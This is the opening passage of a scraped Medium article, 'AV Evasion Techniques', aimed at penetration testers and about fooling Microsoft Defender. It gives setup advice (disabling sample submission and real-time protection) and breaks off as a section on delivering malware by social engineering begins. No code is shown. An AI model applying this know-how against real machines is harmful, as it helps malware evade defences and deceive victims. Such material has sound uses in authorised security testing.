d="M120.25-30.88l-11.78-5.1-51.4 118.43 11.79 5.11 51.4-118.44z" fill="#48E348"></path><path d="M131.13-26.16l-10.88-4.72L68.86 87.56l10.88 4.72 51.4-118.44z" fill="#008EF0"></path><path d="M148.48-18.63l-17.35-7.53-51.4 118.44 17.35 7.53 51.4-118.44z" fill="#9A50FC"></path></g><defs><filter id="logo-wordmark-pride_svg__filter0_f_238_6555" x="-29.5" y="-76.33" width="182.87" height="181.03" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB"><feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood><feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend><feGaussianBlur stdDeviation="2.45" result="effect1_foregroundBlur_238_6555"></feGaussianBlur></filter></defs></svg></a><div class="au h"><div class="ab av aw ax ay q az ba"><div class="bj" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bk bl ab"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.1 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0zm6.94-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .8-.79l-3.74-3.73A8.05 8.05 0 0 0 11.04 3v.01z" fill="currentColor"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="av bb bc bd z be bf bg bh bi" placeholder="Search" value=""></div></div></div><div class="h k w fd fe"><div class="ff ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---two_column_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bc b bd z dr fg fh ab q fi fj"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" aria-label="Write"><path d="M14 4a.5.5 0 0 0 0-1v1zm7 6a.5.5 0 0 0-1 0h1zm-7-7H4v1h10V3zM3 4v16h1V4H3zm1 17h16v-1H4v1zm17-1V10h-1v10h1zm-1 1a1 1 0 0 0 1-1h-1v1zM3 20a1 1 0 0 0 1 1v-1H3zM4 3a1 1 0 0 0-1 1h1V3z" fill="currentColor"></path><path d="M17.5 4.5l-8.46 8.46a.25.25 0 0 0-.06.1l-.82 2.47c-.07.2.12.38.31.31l2.47-.82a.25.25 0 0 0 .1-.06L19.5 6.5m-2-2l2.32-2.32c.1-.1.26-.1.36 0l1.64 1.64c.1.1.1.26 0 .36L19.5 6.5m-2-2l2 2" stroke="currentColor"></path></svg><div class="dq l">Write</div></div></a></span></div></div><div class="k j i d"><div class="ff ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---two_column_layout_nav----------------------------------" rel="noopener follow"><div class="bc b bd z dr fg fh ab q fi fj"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" aria-label="Search"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.1 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0zm6.94-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .8-.79l-3.74-3.73A8.05 8.05 0 0 0 11.04 3v.01z" fill="currentColor"></path></svg></div></a></div></div><div class="ff h k j"><div class="ab q"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><button class="bc b du dv ee dw dx ef dy dz eg eh eb ei ej ed ek el em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" data-testid="headerSignUpButton">Sign up</button></span></p><div class="au l"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;source=post_page---two_column_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="av fk am ab q ao fl fm fn" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fg"><img alt="" class="l fa bv bw bx cu" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"><div class="fo bv l bw bx fp n av fq"></div></div></button></div></div></div><div class="fr"><a rel="me" href="https://infosec.exchange/@karmaz">Mastodon</a></div><div class="l"><div class="pl" role="dialog" aria-modal="true" tabindex="-1"><div class="rl rm be dt rn ro rp ao rq gk rr" aria-hidden="true" role="presentation"></div><div class="rs rn rt ru rv rl dt fa rw rx ry lh rz sa sb sc sd se sf sg sh" aria-hidden="true"></div></div><div class="fs ft fu fv fw l"><div class="ab by"><div class="cf be fx fy fz ga"></div></div><article class="meteredContent"><div class="l"><div class="l"><span class="l"></span><section><div><div class="fp gg gh gi gj gk"></div><div><div class="speechify-ignore l"><div class="tr ts tt tu tv l"></div><div class="ab by"><div class="cn dq tw be tx cf l"><div class="fg ty tz ua sr st ub ql"><p class="bc b bd z bh">You're reading for free via <a class="af ag ah ai aj ak al am an ao ap aq ar te" href="https://medium.com/@monethic?source=post_page-----aa0742d806db--------------------------------" rel="noopener follow">Monethic.io's</a> Friend Link. <span><a class="af ag ah ai aj ak al am an ao ap aq ar te" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;source=-----aa0742d806db---------------------post_friend_link_meter-----------" rel="noopener follow">Become a member</a></span> to access the best of Medium.</p></div><div class="uj uk ul um un l"><div class="fp uc ud gv ue uf ug uh ui"></div></div></div></div><div class="ab by"><div class="cf be fx fy fz ga"><div class="ci l"><div class="gs ab"><div class="bj" aria-hidden="false" aria-describedby="2" aria-labelledby="2"><button class="l av ao am" aria-label="Member-only story"><div class="h k j i d"><div><div class="bj" aria-hidden="false" aria-describedby="1" aria-labelledby="1"><svg width="16" height="16" viewBox="0 0 64 64" fill="none"><path d="M39.64 40.83L33.87 56.7a1.99 1.99 0 0 1-3.74 0l-5.77-15.87a2.02 2.02 0 0 0-1.2-1.2L7.3 33.88a1.99 1.99 0 0 1 0-3.74l15.87-5.77a2.02 2.02 0 0 0 1.2-1.2L30.12 7.3a1.99 1.99 0 0 1 3.74 0l5.77 15.87a2.02 2.02 0 0 0 1.2 1.2l15.86 5.76a1.99 1.99 0 0 1 0 3.74l-15.87 5.77a2.02 2.02 0 0 0-1.2 1.2z" fill="#FFC017"></path></svg></div></div></div><div class="s u w fd fe q"><svg width="16" height="16" viewBox="0 0 64 64" fill="none" class="gq gr"><path d="M39.64 40.83L33.87 56.7a1.99 1.99 0 0 1-3.74 0l-5.77-15.87a2.02 2.02 0 0 0-1.2-1.2L7.3 33.88a1.99 1.99 0 0 1 0-3.74l15.87-5.77a2.02 2.02 0 0 0 1.2-1.2L30.12 7.3a1.99 1.99 0 0 1 3.74 0l5.77 15.87a2.02 2.02 0 0 0 1.2 1.2l15.86 5.76a1.99 1.99 0 0 1 0 3.74l-15.87 5.77a2.02 2.02 0 0 0-1.2 1.2z" fill="#FFC017"></path></svg><p class="bc b bd z dr">Member-only story</p></div></button></div></div></div></div></div></div></div><div class="gt gu gv gw gx"><div class="ab by"><div class="cf be fx fy fz ga"><div><h1 id="d7e3" class="pw-post-title gy gz ha bc hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw bh" data-testid="storyTitle" data-selectable-paragraph="">AV EVASION TECHNIQUES</h1><div class="re rf rg rh ri"><div class="speechify-ignore ab cm"><div class="speechify-ignore be l"><div class="ic id ie if ig ab"><div><div class="ab ih"><a rel="noopener follow" href="/?source=post_page-----aa0742d806db--------------------------------"><div><div class="bj" aria-hidden="false" aria-describedby="94" aria-labelledby="94"><div class="l ii ij bv ik il"><div class="l fg"><img alt="Karol Mazurek" class="l fa bv da db cu" src="https://miro.medium.com/v2/da:true/resize:fill:55:55/0*BLalJfMaz_JDj6fg" width="44" height="44" loading="lazy" data-testid="authorPhoto"><div class="im bv l da db fp n in fq"></div></div></div></div></div></a></div></div><div class="bk be l"><div class="ab"><div style="flex: 1 1 0%;"><span class="bc b bd z bh"><div class="io ab q"><div class="ab q ip"><div class="ab q"><div><div class="bj" aria-hidden="false" aria-describedby="95" aria-labelledby="95"><p class="bc b iq ir bh"><a class="af ag ah ai aj ak al am an ao ap aq ar is" data-testid="authorName" rel="noopener follow" href="/?source=post_page-----aa0742d806db--------------------------------">Karol Mazurek</a></p></div></div></div><span class="it iu" aria-hidden="true"><span class="bc b bd z dr">·</span></span><p class="bc b iq ir dr"><span><a class="iv iw ah ai aj ak al am an ao ap aq ar eu ix iy" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F3f7ab05f0f68&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;user=Karol+Mazurek&amp;userId=3f7ab05f0f68&amp;source=post_page-3f7ab05f0f68----aa0742d806db---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l iz"><span class="bc b bd z dr"><div class="ab ck ja jb jc"><span class="bc b bd z dr"><div class="ab ae"><span data-testid="storyReadTime">11 min read</span><div class="jd je l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bc b bd z dr">·</span></span></div><span data-testid="storyPublishDate">Mar 18, 2022</span></div></span></div></span></div></div></div><div class="ab cm jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju"><div class="h k w fd fe q"><div class="kk l"><div class="ab q kl km"><div class="pw-multi-vote-icon fg gq kn ko kp"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Faa0742d806db&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;user=Karol+Mazurek&amp;userId=3f7ab05f0f68&amp;source=-----aa0742d806db---------------------clap_footer-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="96" aria-labelledby="96"><div class="kq ao kr ks kt ku am kv kw kx kp"><svg width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.37.83L12 3.28l.63-2.45h-1.26zM13.92 3.95l1.52-2.1-1.18-.4-.34 2.5zM8.59 1.84l1.52 2.11-.34-2.5-1.18.4zM18.52 18.92a4.23 4.23 0 0 1-2.62 1.33l.41-.37c2.39-2.4 2.86-4.95 1.4-7.63l-.91-1.6-.8-1.67c-.25-.56-.19-.98.21-1.29a.7.7 0 0 1 .55-.13c.28.05.54.23.72.5l2.37 4.16c.97 1.62 1.14 4.23-1.33 6.7zm-11-.44l-4.15-4.15a.83.83 0 0 1 1.17-1.17l2.16 2.16a.37.37 0 0 0 .51-.52l-2.15-2.16L3.6 11.2a.83.83 0 0 1 1.17-1.17l3.43 3.44a.36.36 0 0 0 .52 0 .36.36 0 0 0 0-.52L5.29 9.51l-.97-.97a.83.83 0 0 1 0-1.16.84.84 0 0 1 1.17 0l.97.97 3.44 3.43a.36.36 0 0 0 .51 0 .37.37 0 0 0 0-.52L6.98 7.83a.82.82 0 0 1-.18-.9.82.82 0 0 1 .76-.51c.22 0 .43.09.58.24l5.8 5.79a.37.37 0 0 0 .58-.42L13.4 9.67c-.26-.56-.2-.98.2-1.29a.7.7 0 0 1 .55-.13c.28.05.55.23.73.5l2.2 3.86c1.3 2.38.87 4.59-1.29 6.75a4.65 4.65 0 0 1-4.19 1.37 7.73 7.73 0 0 1-4.07-2.25zm3.23-12.5l2.12 2.11c-.41.5-.47 1.17-.13 1.9l.22.46-3.52-3.53a.81.81 0 0 1-.1-.36c0-.23.09-.43.24-.59a.85.85 0 0 1 1.17 0zm7.36 1.7a1.86 1.86 0 0 0-1.23-.84 1.44 1.44 0 0 0-1.12.27c-.3.24-.5.55-.58.89-.25-.25-.57-.4-.91-.47-.28-.04-.56 0-.82.1l-2.18-2.18a1.56 1.56 0 0 0-2.2 0c-.2.2-.33.44-.4.7a1.56 1.56 0 0 0-2.63.75 1.6 1.6 0 0 0-2.23-.04 1.56 1.56 0 0 0 0 2.2c-.24.1-.5.24-.72.45a1.56 1.56 0 0 0 0 2.2l.52.52a1.56 1.56 0 0 0-.75 2.61L7 19a8.46 8.46 0 0 0 4.48 2.45 5.18 5.18 0 0 0 3.36-.5 4.89 4.89 0 0 0 4.2-1.51c2.75-2.77 2.54-5.74 1.43-7.59L18.1 7.68z"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ky kz la lb lc ld le"><p class="bc b ds z dr"><span class="lf">--</span></p></div></div></div><div><div class="bj" aria-hidden="false" aria-describedby="97" aria-labelledby="97"><button class="ao kq lh li ab q fh lj lk" aria-label="responses"><svg width="24" height="24" viewBox="0 0 24 24" class="hw"><path d="M18 16.8a7.14 7.14 0 0 0 2.24-5.32c0-4.12-3.53-7.48-8.05-7.48C7.67 4 4 7.36 4 11.48c0 4.13 3.67 7.48 8.2 7.48a8.9 8.9 0 0 0 2.38-.32c.23.2.48.39.75.56 1.06.69 2.2 1.04 3.4 1.04.22 0 .4-.11.48-.29a.5.5 0 0 0-.04-.52 6.4 6.4 0 0 1-1.16-2.65v.02zm-3.12 1.06l-.06-.22-.32.1a8 8 0 0 1-2.3.33c-4.03 0-7.3-2.96-7.3-6.59S8.17 4.9 12.2 4.9c4 0 7.1 2.96 7.1 6.6 0 1.8-.6 3.47-2.02 4.72l-.2.16v.26l.02.3a6.74 6.74 0 0 0 .88 2.4 5.27 5.27 0 0 1-2.17-.86c-.28-.17-.72-.38-.94-.59l.01-.02z"></path></svg><p class="bc b ds z dr"><span class="pw-responses-count lg hw">2</span></p></button></div></div></div><div class="ab q jv jw jx jy jz ka kb kc kd ke kf kg kh rj rk"><div class="ll k j i d"></div><div class="h k"><div><div class="bj" aria-hidden="false" aria-describedby="98" aria-labelledby="98"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Faa0742d806db&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;source=-----aa0742d806db---------------------bookmark_footer-----------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr lm" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div><div class="fa ln ck"><div class="l ae"><div class="ab by"><div class="lo lp lq lr ls lt cf be"><div class="ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Daa0742d806db&amp;operation=register&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;source=-----aa0742d806db---------------------post_audio_button-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="99" aria-labelledby="99"><button aria-label="Listen" data-testid="audioPlayButton" class="af fh ah ai aj ak al lu an ao ap eu lv lw lk lx ly lz ma mb s mc md me mf mg mh mi u mj mk ml"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0zm9-10a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm3.38 10.42l-4.6 3.06a.5.5 0 0 1-.78-.41V8.93c0-.4.45-.63.78-.41l4.6 3.06c.3.2.3.64 0 .84z" fill="currentColor"></path></svg><div class="j i d"><p class="bc b bd z dr">Listen</p></div></button></div></div></a></span></div></div></div></div></div><div class="bj" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bj" aria-hidden="false" aria-describedby="100" aria-labelledby="100"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fh ah ai aj ak al lu an ao ap eu lv lw lk lx ly lz ma mb s mc md me mf mg mh mi u mj mk ml"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M15.22 4.93a.42.42 0 0 1-.12.13h.01a.45.45 0 0 1-.29.08.52.52 0 0 1-.3-.13L12.5 3v7.07a.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5V3.02l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.8a.42.42 0 0 1 .07.5zm-.1.14zm.88 2h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.14c.1.1.15.22.15.35a.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9V8.96c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1z" fill="currentColor"></path></svg><div class="j i d"><p class="bc b bd z dr">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="f2cb" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">How to fool the Microsoft Defender and other anti-virus systems.</p><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl nm"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="420" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg"></picture></div></div></figure><h1 id="be90" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">INTRODUCTION</h1><p id="a2bc" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">During the Penetration Testing, if you come across a <strong class="mo hb">Windows</strong> <strong class="mo hb">OS</strong>, in most cases it will be protected at least by the basic anti-virus system called "<strong class="mo hb">Microsoft Defender</strong>". In this article, you will learn how to bypass it and some of the other anti-viruses to avoid seeing the below message:</p><blockquote class="uo"><p id="bb04" class="up uq ha bc ur us ut uu uv uw ux nj dr" data-selectable-paragraph="">The operation did not complete successfully because the file contains a virus or potentially unwanted software.</p></blockquote></div></div></div><div class="ab by uy uz va vb" role="separator"><span class="su bv bj vc vd ps"></span><span class="su bv bj vc vd ps"></span><span class="su bv bj vc vd"></span></div><div class="gt gu gv gw gx"><div class="ab by"><div class="cf be fx fy fz ga"><h2 id="6420" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">BEFORE YOU START</h2><ul class=""><li id="9433" class="mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj vt vu vv bh" data-selectable-paragraph="">You should turn off <strong class="mo hb">Automatic sample submission</strong> to not deliver the samples to Microsoft during the test.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div class="nk nl vw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jCMC-tvPjX8wuKk7ucrBGg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jCMC-tvPjX8wuKk7ucrBGg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jCMC-tvPjX8wuKk7ucrBGg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jCMC-tvPjX8wuKk7ucrBGg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jCMC-tvPjX8wuKk7ucrBGg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jCMC-tvPjX8wuKk7ucrBGg.png 1100w, https://miro.medium.com/v2/resize:fit:1282/format:webp/1*jCMC-tvPjX8wuKk7ucrBGg.png 1282w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 641px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*jCMC-tvPjX8wuKk7ucrBGg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jCMC-tvPjX8wuKk7ucrBGg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jCMC-tvPjX8wuKk7ucrBGg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jCMC-tvPjX8wuKk7ucrBGg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jCMC-tvPjX8wuKk7ucrBGg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jCMC-tvPjX8wuKk7ucrBGg.png 1100w, https://miro.medium.com/v2/resize:fit:1282/1*jCMC-tvPjX8wuKk7ucrBGg.png 1282w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 641px"><img alt="" class="be lt nx c" width="641" height="259" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:801/1*jCMC-tvPjX8wuKk7ucrBGg.png"></picture></div></figure><ul class=""><li id="599e" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Additionally, you should turn off the <strong class="mo hb">real-time protection</strong> or add the working directory to the <strong class="mo hb">Microsoft Defender Exclusion</strong> list.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl vx"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*tEnZTHy6XSImGfOF5nOJVg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*tEnZTHy6XSImGfOF5nOJVg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*tEnZTHy6XSImGfOF5nOJVg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*tEnZTHy6XSImGfOF5nOJVg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*tEnZTHy6XSImGfOF5nOJVg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tEnZTHy6XSImGfOF5nOJVg.png 1100w, https://miro.medium.com/v2/resize:fit:1338/format:webp/1*tEnZTHy6XSImGfOF5nOJVg.png 1338w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 669px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*tEnZTHy6XSImGfOF5nOJVg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*tEnZTHy6XSImGfOF5nOJVg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*tEnZTHy6XSImGfOF5nOJVg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*tEnZTHy6XSImGfOF5nOJVg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*tEnZTHy6XSImGfOF5nOJVg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*tEnZTHy6XSImGfOF5nOJVg.png 1100w, https://miro.medium.com/v2/resize:fit:1338/1*tEnZTHy6XSImGfOF5nOJVg.png 1338w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 669px"><img alt="" class="be lt nx c" width="669" height="243" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:836/1*tEnZTHy6XSImGfOF5nOJVg.png"></picture></div></div></figure><h1 id="8081" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">MALWARE DELIVERY</h1><p id="454b" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">Foothold can be obtained in two ways using malware delivery.</p><h2 id="822c" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">1. SOCIAL ENGINEERING</h2><p id="da4c" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">In all of the following techniques, the <strong class="mo hb">victim should be persuaded to perform 